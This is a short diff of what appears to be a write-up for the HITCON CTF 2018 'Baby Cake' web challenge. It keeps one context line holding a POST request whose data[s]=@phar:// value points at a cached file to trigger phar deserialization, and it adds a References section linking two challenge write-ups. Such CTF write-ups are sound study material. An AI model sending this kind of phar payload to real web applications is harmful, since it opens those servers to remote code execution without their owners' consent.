@@ -317,3 +317,7 @@ private function _cache_dir($key){
 POST /?url=http://xx.xx.xxx.xx&data[s]=@phar:///../tmp/cache/mycache/172.17.0.1/e494da96585eefa8b3cb4f98309d389b/body.cach
 ```
 
+## References
+[Hitcon 2018 Web - Oh My Raddit / Baby Cake 题解](https://xz.aliyun.com/t/2961)
+
+[HITCON CTF 2018 Web](http://blog.kaibro.tw/2018/10/24/HITCON-CTF-2018-Web/)
